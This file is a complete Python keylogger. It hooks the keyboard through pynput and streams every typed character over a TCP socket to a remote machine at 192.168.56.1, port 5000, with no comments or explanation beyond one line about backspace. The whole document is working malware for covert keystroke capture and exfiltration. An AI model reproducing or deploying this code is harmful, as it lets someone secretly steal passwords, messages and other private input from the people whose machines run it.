from pynput.keyboard import Key, Listener
import socket

PC_IP_ADDRESS = '192.168.56.1'  # PC's IP
PORT = 5000

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((PC_IP_ADDRESS, PORT))

def log_keystroke(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            sock.send(key.char.encode('utf-8'))
        elif key == Key.space:
            sock.send(b' ')
        elif key == Key.enter:
            sock.send(b'\n')
        elif key == Key.backspace:
            pass  # Backspace handling is complex for direct file writing
    except Exception as e:
        pass

with Listener(on_press=log_keystroke) as listener:
    listener.join()

sock.close()